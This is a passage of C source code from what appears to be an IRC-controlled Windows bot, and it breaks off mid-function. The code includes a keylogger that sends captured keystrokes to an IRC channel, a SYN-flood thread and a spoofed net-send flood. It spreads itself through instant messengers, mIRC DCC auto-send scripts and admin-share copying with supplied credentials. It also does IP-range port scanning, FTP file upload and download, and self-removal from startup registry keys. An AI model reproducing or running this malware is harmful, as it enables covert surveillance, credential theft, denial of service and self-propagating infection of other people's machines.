	char ctype[8];
	char cname[128];

	// get connection type/name
	memset(cname, 0, sizeof(cname));
	memset(ctype, 0, sizeof(ctype));
	if (!noigcse) {
		fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0);
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) strncpy(ctype,  "dial-up", sizeof(ctype)-1);
	 	else strncpy(ctype,  "LAN", sizeof(ctype)-1);
	} else {
		strncpy(ctype, "N/A", sizeof(ctype)-1);
		strncpy(cname, "N/A", sizeof(cname)-1);
	}

	// get ip address
	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(ninfo, "connection type: %s (%s). local IP address: %d.%d.%d.%d. connected from: %s", ctype, cname, (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5], host);
	return ninfo; // return the netinfo string
 }
 #endif

 #ifndef NO_SYSINFO
// function used for sysinfo
 char * sysinfo(char *sinfo)
 {
	int total;
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;
	char szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;
	char *szCompname;
	TCHAR szUserName[21];
	DWORD dwUserSize = sizeof(szUserName);

	GlobalMemoryStatus(&memstat); // load memory info into memstat
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo
	char *os;
	char os2[140];
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2000";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else os = "???";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		os = os2;
	}

	total = GetTickCount() / 1000; // GetTickCount() / 1000 = seconds since os started.

	GetComputerName(szBuffer, &dwNameSize);
	szCompname = szBuffer;
	GetUserName(szUserName, &dwUserSize);

	sprintf(sinfo, "cpu: %dMHz. ram: %dMB total, %dMB free. os: Windows %s (%d.%d, build %d). uptime: %dd %dh %dm. box: %s. user: %s.",
		cpuspeed(), memstat.dwTotalPhys / 1048576, memstat.dwAvailPhys / 1048576,
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60, szCompname, szUserName);

	return sinfo; // return the sysinfo string
 }

// cpu speed function
 int cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;

	do {
		startcycle = cyclecount();
		Sleep(1000);
		//  speed = ((cyclecount()-startcycle)/100000)/10;
		speed = (cyclecount() - startcycle) / 1000000; // FIXED

	} while (speed > 1000000); // if speed is 1000GHz+, then something probably went wrong so we try again =P

	// guess 'real' cpu speed by rounding raw cpu speed (something like 601mhz looks kinda tacky)
	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return speed;
 }

// asm for cpuspeed() (used for counting cpu cycles)
 unsigned __int64 cyclecount(void)
 {
 	#if defined (__LCC__) // this code is for lcc
	unsigned __int64 count = 0;
	_asm ("rdtsc\n"
		  "mov %eax,%count\n");
	return count;

	#elif defined (__GNUC__) // this code is for GCC
	unsigned __int64 count = 0;
	__asm__ ("rdtsc;movl %%eax, %0" : "=r" (count));
	return count;

	#else // this code is for MSVC, may work on other compilers (ignore the warnings, MSVC is stupid...)
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
	#endif
 }
 #endif

 #ifndef NO_VISIT
// url visit function
 DWORD WINAPI visit(LPVOID param)
 {
	URL_COMPONENTS url;
	HINTERNET ch, req;
	const char *accept = "*/*";
	char *error = "error visiting URL.";
	vs visit;
	char vhost[128];
	int vport;
	char vuser[128];
	char vpass[128];
	char vpath[256];

	visit = *((vs *)param);
	vs *vsp = (vs *)param;
	vsp->gotinfo = TRUE;

	// zero out string varaiables
	memset(vhost, 0, sizeof(vhost));
	memset(vuser, 0, sizeof(vuser));
	memset(vpass, 0, sizeof(vpass));
	memset(vpath, 0, sizeof(vpath));

	// zero out url structure and set options
	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.dwHostNameLength = 1;
    url.dwUserNameLength = 1;
    url.dwPasswordLength = 1;
    url.dwUrlPathLength = 1;

	do {
		// crack the url (break it into its main parts)
		if (!InternetCrackUrl(visit.host, strlen(visit.host), 0, &url)) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, "invalid URL.", FALSE);
				break;
			}

		// copy url parts into variables
		if (url.dwHostNameLength > 0) strncpy(vhost, url.lpszHostName, url.dwHostNameLength);
		vport = url.nPort;
		if (url.dwUserNameLength > 0) strncpy(vuser, url.lpszUserName, url.dwUserNameLength);
		if (url.dwPasswordLength > 0) strncpy(vpass, url.lpszPassword, url.dwPasswordLength);
		if (url.dwUrlPathLength > 0) strncpy(vpath, url.lpszUrlPath, url.dwUrlPathLength);

		ch = InternetConnect(ih, vhost, vport, vuser, vpass, INTERNET_SERVICE_HTTP, 0, 0);
		if (ch == NULL) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, error, FALSE);
			break;
		}

		req = HttpOpenRequest(ch, NULL, vpath, NULL, visit.referer, &accept, INTERNET_FLAG_NO_UI, 0);
		if (req == NULL) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, error, FALSE);
			break;
		}

		if (HttpSendRequest(req, NULL, 0, NULL, 0)) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, "url visited.", FALSE);
		} else {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, error, FALSE);
		}
	} while(0); // always false, so this never loops, only helps make error handling easier

	InternetCloseHandle(ch);
	InternetCloseHandle(req);
	return 0;
 }
 #endif

 // function for removing the bot's registry entries and executable
 void uninstall(void)
 {
	HKEY key;
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	char cmdline[256];
	char tcmdline[256];
	char cfilename[256];
	char batfile[256];

	//Remove service
	SC_HANDLE hSCM = OpenSCManager( NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	// Maybe it's already there and installed, let's try to run

	SC_HANDLE hService = OpenService( hSCM, ServiceName, SERVICE_ALL_ACCESS );
	DeleteService(hService);


	// remove our registry entries
	if (regrun) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegDeleteValue(key, valuename);
		RegCloseKey(key);
	}

	if (regrunservices) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegDeleteValue(key, valuename);
		RegCloseKey(key);
	}

	sprintf(batfile, "%s\\r.bat", tempdir);
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close
		WriteFile(f, "@echo off\r\n"
					 ":start\r\nif not exist \"\"%1\"\" goto done\r\n"
					 "del /F \"\"%1\"\"\r\n"
					 "del \"\"%1\"\"\r\n"
					 "goto start\r\n"
					 ":done\r\n"
					 "del /F %temp%\r.bat\r\n"
					 "del %temp%\r.bat\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
		sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); // build command line
		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

		// execute the batch file
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
 }

DWORD WINAPI synthread (LPVOID param) {
char *buff;
buff = "";
synt syn;
syn = *((synt *)param);
//synt *syns = (synt *)param;
sprintf(buff, "Done with SYN flood [%iKB/sec]\r\n", SYNFlood(syn.ip, syn.port, syn.length));
//MessageBox(0, syn.socket, "DEBUG", 0);
irc_privmsg(syn.socket, syn.chan, buff, syn.notice);
//irc_privmsg(sock, a[2], sendbuf, notice); 
threads[syn.threadnumber] = 0;
threadd[syn.threadnumber][0] = '\0';
return 0; 
}

#ifndef NO_IMSPREAD
BOOL CALLBACK EnumAIMChild(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	char IMText[56]; //was 55
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return FALSE;
	if(!strcmp(ClassName,"Ate32Class"))
	{
		SendMessage(hwnd,WM_GETTEXT,sizeof(IMText),(LPARAM)IMText);
		if(IMText[55]=='E'||IMText[0]!='<')
		{
			SendMessage(hwnd,WM_SETTEXT,0,(LPARAM)IMmsg); 
			SendMessage(hwnd,WM_KEYDOWN,VK_RETURN,0);
			SendMessage(hwnd,WM_KEYUP,VK_RETURN,0);
		}
	}
	return TRUE;
}

BOOL CALLBACK EnumAIM(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return FALSE;
	if(!strcmp(ClassName,"AIM_IMessage"))
		EnumChildWindows(hwnd,EnumAIMChild,0);
	return TRUE;
}

BOOL CALLBACK EnumMSNChild(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	char IMText[8];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return FALSE;
	if(!strcmp(ClassName,"RichEdit20W"))
	{
		SendMessage(hwnd,WM_GETTEXT,sizeof(IMText),(LPARAM)IMText);
		if(strcmp(IMText,"  Never\0"))
		{
			SendMessage(hwnd,WM_SETTEXT,0,(LPARAM)IMmsg); 
			SendMessage(hwnd,WM_KEYDOWN,VK_RETURN,0);
			SendMessage(hwnd,WM_KEYUP,VK_RETURN,0);
		}
	}
	return TRUE;
}


BOOL CALLBACK EnumMSN(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return FALSE;
	if(!strcmp(ClassName,"IMWindowClass"))
		EnumChildWindows(hwnd,EnumMSNChild,0);
	return TRUE;
}

BOOL CALLBACK EnumYahooChild(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return FALSE;
	if(!strcmp(ClassName,"RICHEDIT"))
	{
		SendMessage(hwnd,WM_SETTEXT,0,(LPARAM)IMmsg); 
		SendMessage(hwnd,WM_KEYDOWN,VK_RETURN,0);
		SendMessage(hwnd,WM_KEYUP,VK_RETURN,0);
	}
	return TRUE;
}


BOOL CALLBACK EnumYahoo(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return FALSE;
	if(!strcmp(ClassName,"IMClass"))
		EnumChildWindows(hwnd,EnumYahooChild,0);
	return TRUE;
}
#endif
#ifndef NO_SCAN
// checks ip for open port
 DWORD WINAPI ip_connect(LPVOID param)
 {
	SOCKET sock;
	SOCKADDR_IN ssin;
	DWORD err;
	char str[256];
	scans scan;

	scan = *((scans *)param);
	scans *scanp = (scans *)param;
	scanp->cgotinfo = TRUE;

	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons(scan.port);
	ssin.sin_addr = scan.addy;

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
	if (err != SOCKET_ERROR) {
		sprintf(str, "%s port %d is open", inet_ntoa(scan.addy), scan.port);
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);
	}
	closesocket(sock);
	return 0;

 }

// scan a range of ips for an open port
 DWORD WINAPI ip_scan(LPVOID param)
 {
	DWORD id, host;
	void *th;
	char str[128];
	scans scan;

	scan = *((scans *)param);
	scans *scanp = (scans *)param;
	scanp->gotinfo = TRUE;

	while(1) {
		sprintf(str, "scan (%s:%d)", inet_ntoa(scan.addy), scan.port);
		strncpy(threadd[scan.threadnum], str, sizeof(threadd[scan.threadnum])-1);
		th = CreateThread(NULL, 0, &ip_connect, (void *)&scan, 0, &id);
		while(1) {
			if (scan.cgotinfo == TRUE) break;
			Sleep(1);
		}
		CloseHandle(th);
		scanp->cgotinfo = FALSE;
		Sleep(scanp->delay);
		memcpy(&host, &scan.addy, 4);
		host = ntohl(host);
		host += 1;
		host = htonl(host);
		memcpy(&scan.addy, &host, 4);
	}

	threads[scan.threadnum] = 0;
	threadd[scan.threadnum][0] = '\0';
	return 0;
 }
#endif

 //keylog
 DWORD WINAPI keylogger(LPVOID Param)
{
	 ImpersonateInteractiveUser();

	 keylog kl;
	 kl = *((keylog *)Param);

	keysock = kl.socket;
	HWND win, winold;
	int bKstate[256]={0};
        int i,x;
	int err = 0;
//	int threadnum = (int)Param;
	char buffer[600];
	char buffer2[800];
	char window[61];
	int state;
	int shift;
	char logfile[MAX_PATH];

//	#ifdef start_keylogger_afterstartup
	char sysdir[MAX_PATH];
	GetSystemDirectory(sysdir, sizeof(sysdir));
	sprintf(logfile,"%s\\%s",sysdir,keylogfilename);
	FILE *log;
	log = fopen(logfile,"aw");
	if (log != NULL) {
		char date[70];
		GetDateFormat(0x409,0,0,"\n[dd:MMM:yyyy, ",date,70);
		fputs(date,log);
		memset(date,0,sizeof(date));
		GetTimeFormat(0x409,0,0," HH:mm:ss]",date,70);
		fputs(date,log);
		fputs(" Keylogger Started\n\n",log);
		fclose(log);
	}
//	#endif

	memset(buffer,0,sizeof(buffer));
	win = GetForegroundWindow();
	winold = win;
	GetWindowText(winold,window,60);
	while (err == 0) {
		Sleep(8);
		win = GetForegroundWindow();
		if (win != winold) {
			if (strlen(buffer) != 0) {
				sprintf(buffer2,"%s (Changed window",buffer);
				err = sendkeys(keysock,buffer2,window,logfile);
				memset(buffer,0,sizeof(buffer));
				memset(buffer2,0,sizeof(buffer2));
			}
			win = GetForegroundWindow();
			winold = win;
			GetWindowText(winold,window,60);

		}
		for(i=0;i<92;i++)
		{
			shift = GetKeyState(VK_SHIFT);
 			x = inputL[i];
			if (GetAsyncKeyState(x) & 0x8000) {
				//see if capslock or shift is pressed doesnt work most of the time on win9x
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 91)))//caps lock and NOT shift
					bKstate[x] = 1;//upercase a-z
				else if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 91)))//caps lock AND shift
					bKstate[x] = 2;//lowercase a-z
				else if (shift < 0) //Shift
					bKstate[x] = 3; //upercase
				else bKstate[x] = 4; //lowercase 
			}

			else {
				if (bKstate[x] != 0)
				{
					state = bKstate[x];
					bKstate[x] = 0;
					if (x == 8) {
						buffer[strlen(buffer)-1] = 0;
						continue;
					}
					else if (strlen(buffer) > 550) {
						win = GetForegroundWindow();
						GetWindowText(win,window,60);
						sprintf(buffer2,"%s (Buffer full",buffer);
						err = sendkeys(keysock,buffer2,window,logfile);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					}
					else if (x == 13)  {
						if (strlen(buffer) == 0) continue;
						win = GetForegroundWindow();
						GetWindowText(win,window,60);
						sprintf(buffer2,"%s (Return",buffer);
						err = sendkeys(keysock,buffer2,window,logfile);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					}
					else if (state == 1 || state == 3)
						strcat(buffer,outputH[i]);
					else if (state == 2 || state == 4)
						strcat(buffer,outputL[i]);
				}

     			}
		}
	}
	return 1;
}

int sendkeys(SOCKET sock,char *buf,char *window,char *logfile)
{
	char buffer[4092];
	strcat(buf,")\n");
//	#ifdef start_keylogger_afterstartup
	int len = 0;
	FILE *log;
	log = fopen(logfile,"aw");
	if (log != NULL) {
		char date[20];
		GetTimeFormat(0x409,0,0,"[HH:mm:ss] ",date,19);
		fputs(date,log);
		len = strlen(date) + strlen(window);
		fputs(window,log);
		len = 75 - len;
		if (len > 0) {
			int c;
			for(c=0;c<len;c++)
				fputc(32,log);

		}
	 	fputs(buf,log);
		fclose(log);
	}
	if (sendkeysto == 0) return 0;
//	#endif

	strcat(buf,"\r");
	if (strlen(keylogchan) == 0) {
		sprintf(buffer,"(%s) .10 %s",window,buf);
	}
	else {
	//	sprintf(buffer,"PRIVMSG %s :(%s).10  %s",keylogchan,window,buf);
		sprintf(buffer,"PRIVMSG %s :(%s) %s",keylogchan,window,buf);
	//	irc_privmsg(sock, keylogchan, buffer, TRUE);

	}
	if (send(sock,buffer,strlen(buffer),0) == SOCKET_ERROR) {
		memset(keylogchan,0,sizeof(keylogchan));
		sendkeysto = 0;
		#ifndef start_keylogger_afterstartup
		return 1;
		#endif
	}
	return 0;
}
//keylog

//DCC Spread
void RandMRC(VOID) {
	int x = 0;

	while(mFiles[x]) { x++; }
	srand(GetTickCount());
	int theRand = rand()%x;
	strcpy(mIRCfName, mFiles[theRand]);
	strcpy(mIRCfBody, mPrivMsg[theRand]);
}

int mIRCSpread(char *chan) {
	ImpersonateInteractiveUser();

	HWND mwnd;
	HANDLE hFileMap;
	LPSTR mData;
	char bFileName[256];
	char mPath[MAX_PATH];
	char mScript[MAX_PATH];
	char mFPath[1024];
	FILE * fp;

	RandMRC();
	mwnd = FindWindow("mIRC", NULL);
	if (mwnd) {
		hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, 4096, "mIRC");
		mData = (LPSTR)MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

		sprintf(mData, "$mircdir");
		SendMessage(mwnd, WM_USER + 201, 1, 0);
		sprintf(mPath, mData);

		GetModuleFileName(GetModuleHandle(NULL), bFileName, sizeof(bFileName));
		sprintf(mFPath, "%s\\%s", mPath, mIRCfName);
		replacestr(mFPath, "\\\\", "\\");
		while (CopyFile(bFileName, mFPath, FALSE) == FALSE) Sleep(2000);

		replacestr(mIRCfName, ".exe", "");
		sprintf(mScript, "%s\\%s%d.mrc", mPath, mIRCfName, rand()%1000);
		replacestr(mScript, "\\\\", "\\");
		fp = fopen(mScript, "a+");
		fprintf(fp, "on *:JOIN:#: { .msg $nick %s | .dcc send -c $nick %s }", mIRCfBody, mFPath);
		fclose(fp);

		sprintf(mData, "//load -rs %s", mScript);
		SendMessage(mwnd, WM_USER + 200, 1, 0);

		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);

	 return 1;
	} else { return 0; }
}
//DCC Spread
 DWORD WINAPI ftpAccess(LPVOID Param)
{
	 Ftp ftp;
	 ftp = *((Ftp *)Param);

	HANDLE fh;
	if (ih != NULL)
	{
		fh = InternetConnect(ih,ftp.url, ftp.port,ftp.u,ftp.p,
		INTERNET_SERVICE_FTP ,0 ,0); //INTERNET_DEFAULT_FTP_PORT
		if (fh != NULL) {
			if (ftp.up)
			{
				FILE *f;
				f = fopen(ftp.f,"r");
				if (f != NULL)
				{
					/*int x =*/ fclose(f);
					char rfile[80];
					char date[70];
					GetDateFormat(0x409,0,0,"yyyy-MMM-dd",date,70);
					char dir[80];
					sprintf(dir,"Files-%s",date);
					/*BOOL dirsuccess =*/ FtpCreateDirectory(fh,dir);					
					sprintf(rfile, "\\%s\\%s", dir, ftp.rf);
					BOOL success = FtpPutFile(fh,ftp.f,rfile,INTERNET_FLAG_TRANSFER_BINARY ,0);
					if (success)
					{
						irc_privmsg(ftp.sock, ftp.chan, "File was upped!\n", ftp.notice);
						if (ftp.del) DeleteFile(ftp.f);
					}
					else irc_privmsg(ftp.sock, ftp.chan, "File transfer failed!\n", ftp.notice);
				}
				else irc_privmsg(ftp.sock, ftp.chan, "No such file!\n", ftp.notice);
			}
			else
			{
			/*	HINTERNET f = FtpOpenFile(
					fh, 
					ftp.f, 
					GENERIC_READ , 
					FTP_TRANSFER_TYPE_BINARY , 
					0
					);

				if (f != NULL)
				{*/
					BOOL success = FtpGetFile(fh,ftp.f,ftp.rf, FALSE, FILE_ATTRIBUTE_NORMAL, INTERNET_FLAG_TRANSFER_BINARY ,0);
					if (success)
					{
						irc_privmsg(ftp.sock, ftp.chan, "File was downloaded!\n", ftp.notice);
						if (ftp.del) DeleteFile(ftp.f);
					}
					else
					{
						char sendbuf[120];
						sprintf(sendbuf,"File transfer failed! %d", GetLastError());
						irc_privmsg(ftp.sock, ftp.chan, sendbuf, ftp.notice);
					}
			/*	}
				else irc_privmsg(ftp.sock, ftp.chan, "Problem reading file!\n", ftp.notice);
				InternetCloseHandle(f);*/
			}
		}
		else irc_privmsg(ftp.sock, ftp.chan, "Unable to connect to site!\n", ftp.notice);
	}
	else irc_privmsg(ftp.sock, ftp.chan, "Internet handle is null!\n", ftp.notice);

	InternetCloseHandle(fh);

	threads[ftp.threadnum] = 0;
	threadd[ftp.threadnum][0] = '\0';
	return 1;
}


//net send flood

 DWORD NetMsgSend(char *target, char *spoof, char *message)
 {
    	#define MAXLEN 50
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) return 1;
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) return 1;
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) return 1;
	DWORD status;
	typedef DWORD (*NETMSGPROC)(LPCWSTR  servername, LPCWSTR  msgname, LPCWSTR  fromname, LPBYTE buf, DWORD buflen);
	NETMSGPROC NetMessageBufferSend;
	HINSTANCE hInst = LoadLibrary("netapi32.dll");
	NetMessageBufferSend = (NETMSGPROC)GetProcAddress(hInst, "NetMessageBufferSend");
	wchar_t server[MAXLEN], from[MAXLEN], msg[MAXLEN];
	mbstowcs(server, target, MAXLEN );
	mbstowcs(from, spoof, MAXLEN );
	mbstowcs(msg, message, MAXLEN );
	status = NetMessageBufferSend(NULL, server, from, (BYTE *) &msg[0], wcslen(msg) * 2);
	FreeLibrary(hInst);
	return status;
}

 //net send flood

 BOOL diskInfo(SOCKET sock, char *chan, BOOL notice)
 {
  char sendbuf[512];
  DWORD nBufferLength = 500;
  char lpBuffer[500];       // pointer to buffer for drive strings

  GetLogicalDriveStrings(nBufferLength,lpBuffer);

  int64t FreeBytesToCaller, TotalBytes, FreeBytes;
  #define E32 ((double)4294967296.)

  for (int i=0; i<= 8;i++)
  {
	  if(GetDriveType(&lpBuffer[4*i]) == DRIVE_FIXED) // fixed drive, assume its a hard drive
	  {
		PULARGE_INTEGER i64FreeBytesToCaller;
		PULARGE_INTEGER i64TotalBytes;    // receives the number of bytes on disk
		PULARGE_INTEGER i64TotalFreeBytes; // receives the free bytes on disk
		BOOL success = GetDiskFreeSpaceEx(&lpBuffer[4*i],
			(PULARGE_INTEGER) &FreeBytesToCaller,
			(PULARGE_INTEGER) &TotalBytes,
			(PULARGE_INTEGER) &FreeBytes);
		if (success)
		{
			sprintf(sendbuf, "[%s]: (%f/%f) free",&lpBuffer[4*i],
				((double) FreeBytes.High*E32 + FreeBytes.Low)/(1024*1024*1024),
				((double) TotalBytes.High*E32 + TotalBytes.Low)/(1024*1024*1024));

			irc_privmsg(sock, chan, sendbuf, notice);
		}
		else
		{
			printf("Error reading: %s",&lpBuffer[4*i]);
		}
		
	  }
  }
	return success;
 }


 //hack <ip> <pass> <login>
 DWORD WINAPI nthack(LPVOID Param)
{
	ImpersonateInteractiveUser();
	nth nt;
	nt = *((nth *)Param);
    DWORD dwLevel;
    DWORD dwMaxLen;
    DWORD dwReadEntries;
    DWORD dwTotalEntries;
    DWORD hResume;
    DWORD dwReturn;
    CHAR szShareName[MAX_PATH];
    CHAR szSharePath[MAX_PATH];
    LPSHARE_INFO_2 lpShareInfo2;
    LPSHARE_INFO_2 lpCurrentInfo;
    DWORD dwK = 0;
//	CHAR szRemotePath[MAX_PATH];
   hResume = 0;


    NETRESOURCE NetResource;
    LPTSTR lpszFileName;
    CHAR szRemoteName[MAX_PATH];
    CHAR szFullPath[MAX_PATH];
    CHAR szNewName[MAX_PATH];
    CHAR szIPAddr[MAX_IP];
    DWORD dwFlags;
    DWORD dwRet;
	BOOL bCopy;
    INT nN;
    SOCKET Socket;
    SOCKADDR_IN SockAddr;
    INT nPort;
    INT nConnect;
  //  CHAR szRemoteShare[MAX_PATH];
	char sendbuf[500];

    /* infinite loop entry point */
	strncpy(szIPAddr, nt.ip, sizeof(szIPAddr)-1);
	
//---- SCAN PORT 139 ----\\/
    nPort = 139;
    Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    SockAddr.sin_family = AF_INET;
    SockAddr.sin_port = htons(nPort);
    SockAddr.sin_addr.s_addr = inet_addr(szIPAddr);

    nConnect = connect(Socket, (SOCKADDR *) &SockAddr, sizeof(SockAddr));
    if (nConnect != SOCKET_ERROR)
    {
//		sprintf(sendbuf, "%s:%i is open", szIPAddr, nPort);
//		irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);
 		closesocket(Socket);
//---- SCAN PORT 139 ----\\/



//---- CONNECT TO IP ----\\ 
        /* made it this far? construct string */
        /* string should look like: \\10.0.0.1\C$  */
        strcpy(szRemoteName, "\\\\");
        strcat(szRemoteName, szIPAddr);
        strcat(szRemoteName, "\\ADMIN$");

        dwFlags = 0;
        bCopy = FALSE;
		ZeroMemory  (&NetResource, sizeof(NETRESOURCE)); 
 		NetResource.dwType = RESOURCETYPE_DISK;
		NetResource.lpLocalName = NULL;
		NetResource.lpRemoteName = szRemoteName;
		NetResource.lpProvider = NULL;

//		sprintf(sendbuf, "Attempting to connect to %s\n", szRemoteName);
//		irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);

        /* establish silent netbios connection with remote system */
	    if (strcmp(nt.p, "0") == 0)	dwRet = WNetAddConnection2(&NetResource, "", nt.u, 0);
		else dwRet = WNetAddConnection2(&NetResource, nt.p, nt.u, 0);
		if (dwRet == NO_ERROR)
        {
//---- WE ARE CONNECTED TO THE PC ----\\/
			sprintf(sendbuf, "Connected to %s:%i", szIPAddr, nPort);
			irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);

			CHAR szFoundShare[MAX_PATH];

			wchar_t wcRemoteAddr[MAX_PATH] = L"";
			mbstowcs(wcRemoteAddr, szIPAddr, strlen(szIPAddr) + 1);

			lpShareInfo2 = NULL;
			dwLevel = 2;
			dwMaxLen = 8192;
			hResume = 0;

//			sprintf(sendbuf, "Shares zoeken van %s", szRemoteName);
//			irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);

//---- GET THE SHARES OF PC ----\\/
			dwReturn = NetShareEnum((CHAR *) wcRemoteAddr, dwLevel, (LPBYTE *) &lpShareInfo2, dwMaxLen, &dwReadEntries, &dwTotalEntries, &hResume);
			if (dwReturn != ERROR_MORE_DATA && dwReturn != ERROR_SUCCESS)
			{
				sprintf(sendbuf, "Unable to retrieve share nfo, %ld!",dwReturn);
				irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);

				return 0;
			}
			for (dwK = 0, lpCurrentInfo = lpShareInfo2; dwK < dwReadEntries; ++dwK, ++lpCurrentInfo)
			{
//				sprintf(szShareName, "%S", lpCurrentInfo->shi2_netname);
//				sprintf(szSharePath, "%S", lpCurrentInfo->shi2_path);
//				sprintf(sendbuf, "ShareName: %s. SharePath: %s", szShareName, szSharePath);
//				irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);
				if (strcmp(szSharePath, "C:\\") == 0 || strcmp(szSharePath, "c:\\") == 0)
				{
					memset(szFoundShare, '\0', sizeof(szFoundShare));
					strcpy(szFoundShare, szShareName);
					NetApiBufferFree(lpShareInfo2);
					NetApiBufferFree(lpCurrentInfo);
					//	return 1;
				}
			}
			NetApiBufferFree(lpShareInfo2);
			NetApiBufferFree(lpCurrentInfo);

//---- WE GOT THE SHARES NFO ----\\/
			/* construct strings for copying file and copy file*/
			/* if file copy is success, attempt remote execution */

//---- COPYING FILE TO PC ----\\/
			strcpy(szNewName, "\\\\");
			strcat(szNewName, szIPAddr);
			strcat(szNewName, "\\");
			// strcat(szNewName, szFoundShare);
			strcat(szNewName, "\\ADMIN$\\System32\\");
			/* get this filename and full path of this file */
	        GetModuleFileName(GetModuleHandle(NULL), szFullPath, sizeof(szFullPath));
			lpszFileName = strrchr(szFullPath, '\\');
			strcat(szNewName, lpszFileName);
			sprintf(sendbuf, "Copying file from %s to %s", szFullPath, szNewName);
